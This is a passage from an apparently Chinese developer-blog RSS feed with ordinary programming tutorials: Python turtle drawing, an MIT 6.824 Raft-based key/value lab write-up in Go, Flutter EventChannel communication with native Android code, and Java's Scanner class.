&lt;p&gt;github: &lt;a href=&quot;https://github.com/2881099/FreeSql&quot; class=&quot;uri&quot;&gt;https://github.com/2881099/FreeSql&lt;/a&gt; 377星&lt;/p&gt;
&lt;p&gt;还请献上宝贵的一星，谢谢观看！！&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 13:02:00 +0000</pubDate>
<dc:creator>nicye</dc:creator>
<og:description>FreeSql 发展到现在，已经有两种稳定的开发模式，以下先简单带过一下。后面才是本文的主题。 方法一：基于 helper 的方式，祼用； dotnet add package FreeSql 提供</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kellynic/p/10580936.html</dc:identifier>
</item>
<item>
<title>Python入门必学，用Python练习画个美队盾牌 - 上海小胖</title>
<link>http://www.cnblogs.com/moonhmily/p/10580824.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/moonhmily/p/10580824.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190322202431995.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTIzNjU4Mjg=,size_16,color_FFFFFF,t_70&quot; alt=&quot;美队盾牌&quot;/&gt;&lt;/p&gt;

&lt;p&gt;Python版本：3.6.6&lt;/p&gt;
&lt;p&gt;操作系统：Mac OS Mojave 10.14.2&lt;/p&gt;

&lt;p&gt;最近我媳妇每天晚上吃饭时候也拿手机看，上厕所也在看。&lt;/p&gt;
&lt;p&gt;看着看着还会笑？WTF？你在干嘛呢？&lt;/p&gt;
&lt;p&gt;没错，她在看美队……&lt;/p&gt;
&lt;p&gt;这男人比我帅？……&lt;/p&gt;
&lt;p&gt;比我有钱？……&lt;/p&gt;
&lt;p&gt;还是比我有腔调？……&lt;/p&gt;
&lt;p&gt;答案很明显，我相信你们的眼睛都是雪亮的。&lt;/p&gt;
&lt;p&gt;那问题来了，作为一个男人，怎么能忍？虽然是个明星，虽然是假的，虽然已经挽回不了败局了……那我就送个美队的盾牌给你吧……&lt;/p&gt;
&lt;p&gt;这篇文章不是Turtle的入门篇，所以关于基本的画笔使用小胖不在这篇里赘述了。有兴趣的可以留言，我会根据你们的反馈来写一篇或者一个系列。&lt;/p&gt;

&lt;p&gt;先来看一个效果图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190322200514458.gif&quot; alt=&quot;美队盾牌&quot;/&gt;&lt;/p&gt;
&lt;p&gt;用过Turtle的都知道，画笔是需要抬手和落笔的。这一点一定要理解，因为计算机是很死板的，你的每一个动作都必须告诉他，包括GC。&lt;/p&gt;
&lt;p&gt;所以你的画笔一旦落下，经过的每一处都会留下字迹。如果希望隔开一段距离就需要经过「抬笔」-&amp;gt;「移动画笔」-&amp;gt;「落笔」。&lt;/p&gt;
&lt;p&gt;所以我们先把这个动作封装成一个函数：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def setpen(x, y):
    # 抬笔
    t.penup()
    # 移动画笔到(x, y)
    t.goto(x, y)
    # 落笔
    t.pendown()
    t.setheading(0)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来就来画盾牌。盾牌的话，注意观察美队盾牌，颜色是「红」-&amp;gt;「白」-&amp;gt;「红」-&amp;gt;「蓝」。&lt;/p&gt;
&lt;p&gt;这里有一个技巧，就是后面填充的圆圈背景色是可以覆盖之前画的圆圈的背景色。&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def circle(x, y, r, color):
    # 为了保证画出的圆够圆，所以我们把圆的边设置的多一些
    n = 36
    angle = 360 / n
    pi = 3.1415926
    # 周长
    c = 2 * pi * r
    # 每条边的长度
    l = c / n
    # 起始位置
    start_x = x - l / 2
    start_y = y + r
    # 移动画笔
    setpen(start_x, start_y)
    # 选择画笔颜色
    t.pencolor(color)
    # 选择背景色
    t.fillcolor(color)
    # 填充
    t.begin_fill()
    for i in range(n):
        t.forward(l)
        t.right(angle)
    t.end_fill()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来就是画里面那个白色的五角星了，这里就不注释了，因为和画圈的过程差不多。&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def five_star(l):
    setpen(0, 0)
    t.setheading(162)
    t.forward(150)
    t.setheading(0)
    t.fillcolor('WhiteSmoke')
    t.begin_fill()
    t.hideturtle()
    t.penup()
    for i in range(5):
        t.forward(l)
        t.right(144)
    t.end_fill()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;主函数：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def sheild():
    circle(0, 0, 300, 'red')
    circle(0, 0, 250, 'white')
    circle(0, 0, 200, 'red')
    circle(0, 0, 150, 'blue')
    five_star(284)

if __name__ == '__main__':
    sheild()
    # 结束乌龟图
    turtle.done()&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;这是一篇用Python画画的文章，更多有趣、好玩的Python应用、实战尽在知识星球「人人都是Pythonista」。&lt;/p&gt;
&lt;p&gt;关注公众号「&lt;strong&gt;Python专栏&lt;/strong&gt;」，回复：&lt;strong&gt;美队盾牌&lt;/strong&gt;，获取全套代码！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/649191/201902/649191-20190228222044609-1976101388.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;Python专栏二维码&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 12:35:00 +0000</pubDate>
<dc:creator>上海小胖</dc:creator>
<og:description>这是一篇用Python画画的文章，更多有趣、好玩的Python应用、实战尽在知识星球「人人都是Pythonista」。 关注公众号「**Python专栏**」，回复：**美队盾牌**，获取全套代</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/moonhmily/p/10580824.html</dc:identifier>
</item>
<item>
<title>MIT-6.824 Lab 3: Fault-tolerant Key/Value Service - gatsby123</title>
<link>http://www.cnblogs.com/gatsby123/p/10580757.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/gatsby123/p/10580757.html</guid>
<description>&lt;p&gt;lab2中实现了raft协议，本lab将在raft之上实现一个可容错的k/v存储服务，第一部分是实现一个不带日志压缩的版本，第二部分是实现日志压缩。时间原因我只完成了第一部分。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.824/lab3-KVServer/kvserver.png&quot; alt=&quot;kvserver&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上图，lab2实现了raft协议，本lab将实现kvserver。每个raft都关联一个kvserver，Clerks发送Put(), Append(), Get() RPC给leader服务器中的kvserver，kvserver收到请求后将操作打包成Log Entry提交给raft，然后阻塞等待raft将这个Entry拷贝到其它server，当Log Entry被拷贝到大部分的server后，leader 的raft会通知kvserver（raft往管道中塞comitted Entry，kvserver通过读这个管道获取通知），kvserver执行命令，然后响应Clerk。&lt;/p&gt;
&lt;h2 id=&quot;clerk&quot;&gt;Clerk&lt;/h2&gt;
&lt;p&gt;客户端通过Clerk发送请求，来看下Clerk代码：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;type Clerk struct {
    servers []*labrpc.ClientEnd
    // You will have to modify this struct.

    lastLeader  int
    cid         int64
    seq         int
}

func (ck *Clerk) Get(key string) string {

    // You will have to modify this function.
    // 参数: 要读的key, 当前clerk的id，  请求序列号
    getArgs := GetArgs{Key: key, Cid:ck.cid, Seq:ck.seq}
    reply := GetReply{}

    for {
        doneCh := make(chan bool, 1)
        go func() {
           //发送Get() RPC
            ok := ck.servers[ck.lastLeader].Call(&quot;KVServer.Get&quot;, &amp;amp;getArgs, &amp;amp;reply)
            doneCh &amp;lt;- ok
        }()

        select {
        case &amp;lt;-time.After(600 * time.Millisecond):
            DPrintf(&quot;clerk(%d) retry PutAppend after timeout\n&quot;, ck.cid)
            continue
        case ok := &amp;lt;- doneCh:
           //收到响应后，并且是leader返回的，那么说明这个命令已经执行了
            if ok &amp;amp;&amp;amp; reply.WrongLeader != WrongLeader {
                //请求序列号加1
              ck.seq++
                return reply.Value
            }
        }

       //换一个server重试
        ck.lastLeader++
        ck.lastLeader %= len(ck.servers)
    }

    return &quot;&quot;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里只给出了Get()的代码，Put()和Append()类似，发送KVServer.Get给一个server，如果这个server不是leader，换一个server重试。直到发给真正的leader，并且leader将这个命令拷贝到大部分其它server后，然后成功执行该命令，Clerk.Get()才会返回。&lt;/p&gt;
&lt;h2 id=&quot;kvserver&quot;&gt;KVServer&lt;/h2&gt;
&lt;p&gt;再来看下服务端的代码，KVServer处理Clerk的RPC请求：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;type KVServer struct {
    mu      sync.Mutex
    me      int
    rf      *raft.Raft
    applyCh chan raft.ApplyMsg

    maxraftstate int // snapshot if log grows this big

    // Your definitions here.
   // 保存键值对
    db      map[string]string
    latestReplies map[int64]*LatestReply
    notify map[int]chan struct{}
}

func (kv *KVServer) Get(args *GetArgs, reply *GetReply) {
    // Your code here.
    if _, isLeader := kv.rf.GetState(); !isLeader {
        reply.WrongLeader = WrongLeader
        reply.Err = &quot;&quot;
        return
    }

    // 防止重复请求
    kv.mu.Lock()
    if latestReply, ok := kv.latestReplies[args.Cid]; ok &amp;amp;&amp;amp; args.Seq &amp;lt;= latestReply.Seq {
        reply.WrongLeader = IsLeader
        reply.Value = latestReply.Reply.Value
        reply.Err = latestReply.Reply.Err
        kv.mu.Unlock()
        return
    }
    kv.mu.Unlock()

    command := Op{Operation:&quot;Get&quot;, Key:args.Key, Cid:args.Cid, Seq:args.Seq}
    index, term, _ := kv.rf.Start(command)

    // 阻塞等待结果
    kv.mu.Lock()
    ch := make(chan struct{})
    kv.notify[index] = ch
    kv.mu.Unlock()

    select {
    case &amp;lt;-ch:
        curTerm, isLeader := kv.rf.GetState()
        DPrintf(&quot;%v got notify at index %v, isLeader = %v\n&quot;, kv.me, index, isLeader)
        if !isLeader || curTerm != term {
            reply.WrongLeader = WrongLeader
            reply.Err = &quot;&quot;
        } else {
            reply.WrongLeader = IsLeader
            kv.mu.Lock()
            if value, ok := kv.db[args.Key]; ok {
                reply.Value = value
                reply.Err = OK
            } else {
                reply.Err = ErrNoKey
            }
            kv.mu.Unlock()
        }

    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;KVServer.db用于保存键值对。&lt;br/&gt;KVServer.Get()首先判断自己是不是leader，如果不是leader，直接返回，这样Clerk好重试其它server。如果是leader，先在缓存中找，看这个请求是否已经执行过了。&lt;br/&gt;因为可能出现这么一种情况：如果leader commit一个Entry后立即奔溃了，那么Clerk就收不到响应，那么Clerk会将这个请求发给新的leader，新的leader收到请求后如果不做任何措施，将会二次commit该Log Entry，对于Put()和Append()请求执行两次是不正确的，所以需要一个办法防止一个请求执行两次。&lt;br/&gt;可以这么做：每个Clerk都分配一个唯一的cid，每个请求分配一个唯一的序列号seq，每成功一个请求，该序列号加一。服务端记录每个客户端cid最近一次apply的请求的序列号seq和对应的响应结果，根据这个信息可知，当再次收到这个客户端的序列号小于seq的请求时，说明已经执行过了，直接返回结果。&lt;/p&gt;
&lt;p&gt;如果之前没有执行过，那么调用&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;kv.rf.Start(command)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将Log Entry提交给raft，并且阻塞等待raft将这个Entry拷贝到其它大部分server，从阻塞返回后，说明这个Entry已经被拷贝到大部分server了，并且已经执行了命令，这时可以将结果返回给Clerk了。&lt;/p&gt;
&lt;p&gt;那么在哪里接收raft的消息呢？KVServer在创建的时候会在一个线程中执行如下函数：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func (kv *KVServer) applyDaemon()  {
    for appliedEntry := range kv.applyCh {
        command := appliedEntry.Command.(Op)

        // 执行命令, 过滤已经执行过得命令
        kv.mu.Lock()
        if latestReply, ok := kv.latestReplies[command.Cid]; !ok || command.Seq &amp;gt; latestReply.Seq {
            switch command.Operation {
            case &quot;Get&quot;:
                latestReply := LatestReply{Seq:command.Seq,}
                reply := GetReply{}
                if value, ok := kv.db[command.Key]; ok {
                    reply.Value = value
                } else {
                    reply.Err = ErrNoKey
                }
                latestReply.Reply = reply
                kv.latestReplies[command.Cid] = &amp;amp;latestReply
            case &quot;Put&quot;:
                kv.db[command.Key] = command.Value
                latestReply := LatestReply{Seq:command.Seq}
                kv.latestReplies[command.Cid] = &amp;amp;latestReply
            case &quot;Append&quot;:
                kv.db[command.Key] += command.Value
                latestReply := LatestReply{Seq:command.Seq}
                kv.latestReplies[command.Cid] = &amp;amp;latestReply
            default:
                panic(&quot;invalid command operation&quot;)
            }
        }

        DPrintf(&quot;%d applied index:%d, cmd:%v\n&quot;, kv.me, appliedEntry.CommandIndex, command)

        // 通知
        if ch, ok := kv.notify[appliedEntry.CommandIndex]; ok &amp;amp;&amp;amp; ch != nil {
            DPrintf(&quot;%d notify index %d\n&quot;,kv.me, appliedEntry.CommandIndex)
            close(ch)
            delete(kv.notify, appliedEntry.CommandIndex)
        }
        kv.mu.Unlock()
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;kv.applyCh这个chanel会在创建raft的时候传给raft，当某个Log Entry可以被commit的时候，raft会往这个chanel中塞，只要for循环这个kv.applyCh，就能知道已经被commit的Entry，拿到Entry后，根据其中的命令执行相应的操作，然后通知KVServer.Get()继续执行。&lt;/p&gt;
&lt;p&gt;具体代码在：&lt;a href=&quot;https://github.com/gatsbyd/mit_6.824_2018&quot; class=&quot;uri&quot;&gt;https://github.com/gatsbyd/mit_6.824_2018&lt;/a&gt;&lt;br/&gt;如有错误，欢迎指正：&lt;br/&gt;15313676365&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 12:22:00 +0000</pubDate>
<dc:creator>gatsby123</dc:creator>
<og:description>概述 lab2中实现了raft协议，本lab将在raft之上实现一个可容错的k/v存储服务，第一部分是实现一个不带日志压缩的版本，第二部分是实现日志压缩。时间原因我只完成了第一部分。 设计思路 ![k</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/gatsby123/p/10580757.html</dc:identifier>
</item>
<item>
<title>Flutter 即学即用系列博客——09 EventChannel 实现原生与 Flutter 通信（一） - AndroidTraveler</title>
<link>http://www.cnblogs.com/nesger/p/10580750.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nesger/p/10580750.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/5361063-c6f10fe2de96dc72.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/800&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;前言&quot;&gt;前言&lt;/h4&gt;
&lt;p&gt;紧接着上一篇，这一篇我们讲一下原生怎么给 Flutter 发信号，即原生-&amp;gt; Flutter&lt;/p&gt;
&lt;p&gt;还是通过 Flutter 官网的 Example 来讲解。&lt;/p&gt;
&lt;h4 id=&quot;案例&quot;&gt;案例&lt;/h4&gt;
&lt;p&gt;接着上一次，这一次我们让原生主动将电池的充电状态发送给 Flutter 并在界面显示。&lt;/p&gt;
&lt;p&gt;步骤如下。&lt;/p&gt;
&lt;h5 id=&quot;flutter-界面修改&quot;&gt;1. Flutter 界面修改&lt;/h5&gt;
&lt;p&gt;我们在原先基础上增加一列用于显示文本。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;String _chargingStatus = 'Battery status: unknown.';
Text(_chargingStatus),&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;flutter-定义-eventchannel&quot;&gt;2. Flutter 定义 EventChannel&lt;/h5&gt;
&lt;p&gt;我们在 _BatteryWidgetState 里面加入下面变量：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;static const EventChannel eventChannel = EventChannel('samples.flutter.io/charging');&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;samples.flutter.io/charging 可以自己指定，一般保证唯一，所以 samples 实际使用可以替换为包名。主要是要跟原生对应即可。&lt;/p&gt;
&lt;h5 id=&quot;flutter-在-initstate-实现-eventchannel-监听并实现对应回调方法&quot;&gt;3. Flutter 在 initState 实现 EventChannel 监听并实现对应回调方法&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;  @override
  void initState() {
    super.initState();
    eventChannel.receiveBroadcastStream().listen(_onEvent, onError: _onError);
  }

  void _onEvent(Object event) {
    setState(() {
      _chargingStatus =
      &quot;Battery status: ${event == 'charging' ? '' : 'dis'}charging.&quot;;
    });
  }

  void _onError(Object error) {
    setState(() {
        PlatformException exception = error;
        _chargingStatus = exception?.message ?? 'Battery status: unknown.';
    });
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到如果原生发送 charging 显示 charging，否则显示 discharging。&lt;/p&gt;
&lt;p&gt;当然错误显示的是原生发送过来的错误信息。&lt;/p&gt;
&lt;p&gt;注意这里如果要获取到错误信息，需要通过&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;PlatformException exception = error;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个转换语句才可以。&lt;/p&gt;
&lt;h5 id=&quot;原生定义-eventchannel&quot;&gt;4. 原生定义 EventChannel&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;private static final String CHARGING_CHANNEL = &quot;samples.flutter.io/charging&quot;;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意需要跟 Flutter 的一一对应。&lt;/p&gt;
&lt;h5 id=&quot;原生创建-eventchannel-并通过-streamhandler-的-eventsink-发送内容给-flutter&quot;&gt;5. 原生创建 EventChannel 并通过 StreamHandler 的 EventSink 发送内容给 Flutter&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;new EventChannel((FlutterView) flutterView, CHARGING_CHANNEL).setStreamHandler(
        new EventChannel.StreamHandler() {

            @Override
            public void onListen(Object arguments, EventChannel.EventSink events) {
            }

            @Override
            public void onCancel(Object arguments) {
            }
        }
);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;具体到这里为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;new EventChannel((FlutterView)flutterView, CHARGING_CHANNEL).setStreamHandler(
        new EventChannel.StreamHandler() {
            private BroadcastReceiver chargingStateChangeReceiver;
            @Override
            public void onListen(Object arguments, EventChannel.EventSink events) {
                chargingStateChangeReceiver = createChargingStateChangeReceiver(events);
                registerReceiver(
                        chargingStateChangeReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            }

            @Override
            public void onCancel(Object arguments) {
                unregisterReceiver(chargingStateChangeReceiver);
                chargingStateChangeReceiver = null;
            }
        }
);

private BroadcastReceiver createChargingStateChangeReceiver(final EventChannel.EventSink events) {
    return new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);

            if (status == BatteryManager.BATTERY_STATUS_UNKNOWN) {
                events.error(&quot;UNAVAILABLE&quot;, &quot;Charging status unavailable&quot;, null);
            } else {
                boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                        status == BatteryManager.BATTERY_STATUS_FULL;
                events.success(isCharging ? &quot;charging&quot; : &quot;discharging&quot;);
            }
        }
    };
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的 &lt;strong&gt;events.success&lt;/strong&gt; 和 &lt;strong&gt;events.error&lt;/strong&gt; 分别会调用 Flutter 的对应方法。&lt;/p&gt;
&lt;p&gt;其中 error 的参数对应 Flutter 的 PlatformException 的参数。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;PlatformException({
  @required this.code,
  this.message,
  this.details,
}) : assert(code != null);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里通过广播的方式将电量状态变化发送给 Flutter。&lt;/p&gt;
&lt;p&gt;效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/5361063-cf17f16210874320.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;扩展&quot;&gt;扩展&lt;/h4&gt;
&lt;p&gt;其实我们点击 Flutter 的 EventChannel，会看到源码里面的 receiveBroadcastStream 方法是对 MethodChannel 做了封装。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Stream&amp;lt;dynamic&amp;gt; receiveBroadcastStream([dynamic arguments]) {
    final MethodChannel methodChannel = MethodChannel(name, codec);
    StreamController&amp;lt;dynamic&amp;gt; controller;
    controller = StreamController&amp;lt;dynamic&amp;gt;.broadcast(onListen: () async {
      BinaryMessages.setMessageHandler(name, (ByteData reply) async {
        if (reply == null) {
          controller.close();
        } else {
          try {
            controller.add(codec.decodeEnvelope(reply));
          } on PlatformException catch (e) {
            controller.addError(e);
          }
        }
        return null;
      });
      try {
        await methodChannel.invokeMethod('listen', arguments);
      } catch (exception, stack) {
        FlutterError.reportError(FlutterErrorDetails(
          exception: exception,
          stack: stack,
          library: 'services library',
          context: 'while activating platform stream on channel $name',
        ));
      }
    }, onCancel: () async {
      BinaryMessages.setMessageHandler(name, null);
      try {
        await methodChannel.invokeMethod('cancel', arguments);
      } catch (exception, stack) {
        FlutterError.reportError(FlutterErrorDetails(
          exception: exception,
          stack: stack,
          library: 'services library',
          context: 'while de-activating platform stream on channel $name',
        ));
      }
    });
    return controller.stream;
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所以其实原生-&amp;gt; Flutter 的通信也是可以用 MethodChannel 直接实现。&lt;/p&gt;
&lt;p&gt;那怎么实现呢？&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;欲知详情，且听下回讲解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/5361063-4e661dcb8cd24bc7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文源码位置：&lt;/strong&gt;&lt;br/&gt;https://github.com/nesger/FlutterSample/tree/feature/event_channel&lt;/p&gt;
&lt;h5 id=&quot;参考链接&quot;&gt;参考链接：&lt;/h5&gt;
&lt;p&gt;https://flutter.dev/docs/development/platform-integration/platform-channels&lt;br/&gt;https://github.com/flutter/flutter/tree/master/examples/platform_channel&lt;/p&gt;
&lt;p&gt;更多阅读：&lt;br/&gt;&lt;strong&gt;Flutter 即学即用系列博客&lt;/strong&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/mEwJE5mXwpmuWgVNL9O42g&quot;&gt;Flutter 即学即用系列博客——01 环境搭建&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/LAmQYsjZmn56HZWrSZ59vQ&quot;&gt;Flutter 即学即用系列博客——02 一个纯 Flutter Demo 说明&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/OGbH3G3wHVTUt-0EJit8RA&quot;&gt;Flutter 即学即用系列博客——03 在旧有项目引入 Flutter&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/8s2ye_bvkUDn8yrEEDS1dQ&quot;&gt;Flutter 即学即用系列博客——04 Flutter UI 初窥&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/TiJgFsZkHaNWSnvGfUraTQ&quot;&gt;Flutter 即学即用系列博客——05 StatelessWidget vs StatefulWidget&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/bWAefJgqFQu5xRWvsCXLBQ&quot;&gt;Flutter 即学即用系列博客——06 超实用 Widget 集锦&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/CfXR3nshGD8LwG0FgaemVw&quot;&gt;Flutter 即学即用系列博客——07 RenderFlex overflowed 引发的思考&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/aPFO_IsRED8flVxWRdchKw&quot;&gt;Flutter 即学即用系列博客——08 MethodChannel 实现 Flutter 与原生通信&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flutter &amp;amp; dart&lt;/strong&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/7-F_p8SPTZpKKKzE1Hc8YQ&quot;&gt;dart 如何优雅的避空&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/i6lUDj_WTZu1CFtdICdaIw&quot;&gt;Flutter map 妙用及 .. 使用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/5361063-7bf91fa856fa8f75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 12:19:00 +0000</pubDate>
<dc:creator>AndroidTraveler</dc:creator>
<og:description>前言 紧接着上一篇，这一篇我们讲一下原生怎么给 Flutter 发信号，即原生 Flutter 还是通过 Flutter 官网的 Example 来讲解。 案例 接着上一次，这一次我们让原生主动将电池</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/nesger/p/10580750.html</dc:identifier>
</item>
<item>
<title>Scanner类详解 - 冰湖一角</title>
<link>http://www.cnblogs.com/bingyimeiling/p/10580447.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bingyimeiling/p/10580447.html</guid>
<description>&lt;p&gt;Scanner类用于获取键盘输入（是一个基于正则表达式的文本扫描器），它可以从文件、字符串、输入流中解析出基本类型值和字符串值。Scanner类提供了多个构造器，不同的构造器可以接收文件、字符串和输入流作为数据源，用于从文件、字符串和输入流中解析数据。&lt;/p&gt;
&lt;p&gt;Scanner类主要提供了两个方法来扫描输入：&lt;br/&gt;1）hasNextXx()：是否还有下一个输入项，其中Xxx可以是Int、Long等代表基本数据类型的字符串。如果只是判断是否包含下一个字符串，则直接使用hasNext()。&lt;/p&gt;
&lt;p&gt;2）nextXxx()：获取下一个输入项。Xxx的含义同上。&lt;/p&gt;
&lt;p&gt;默认情况下，Scanner使用空白（包括空格、Tab空白和回车）作为多个输入项的分隔符。&lt;/p&gt;
&lt;p&gt;下面程序使用Scanner来获得用户的键盘输入：&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;System.in代表键盘输入&lt;/span&gt;
        Scanner sc = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Scanner(System.in);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;下面这行代码是把回车作为分隔符&lt;/span&gt;
        sc.useDelimiter(&quot;\n&quot;&lt;span&gt;);
　　　　&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断是否还有下一个输入项&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;&lt;span&gt;(sc.hasNext()){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;输出输入项&lt;/span&gt;
            System.out.println(&quot;键盘输入的内容是：&quot;+&lt;span&gt;sc.next());    
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 运行上面的程序，程序会通过Scanner不断的从键盘读取键盘输入，然后打印到控制台，程序运行效果如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;java
键盘输入的内容是：java
c&lt;/span&gt;++&lt;span&gt;
键盘输入的内容是：c&lt;/span&gt;++&lt;span&gt;
html
键盘输入的内容是：html&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;为Scanner设置分隔符使用 useDelimiter(String pattern)方法即可，该方法的参数是一个正则表达式（后面发布内容会介绍到），如果把上面程序这一行sc.useDelimiter(&quot;\n&quot;)注释掉，该程序就会把键盘的每行输入当成一个输入项，不会以空格、Tab空白或回车等作为分隔符。&lt;/p&gt;
&lt;p&gt;其实，Scanner提供了两个简单的逐行读取的方法：&lt;/p&gt;
&lt;p&gt;1）boolean hasNextLine()：返回输入源中是否还有下一行。&lt;/p&gt;
&lt;p&gt;2）String nextLine()：返回输入源中下一行的字符串。&lt;/p&gt;
&lt;p&gt;Scanner除了可以获取字符串输入项之外，还可以获取任意基本类型的输入项，如下程序：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args){
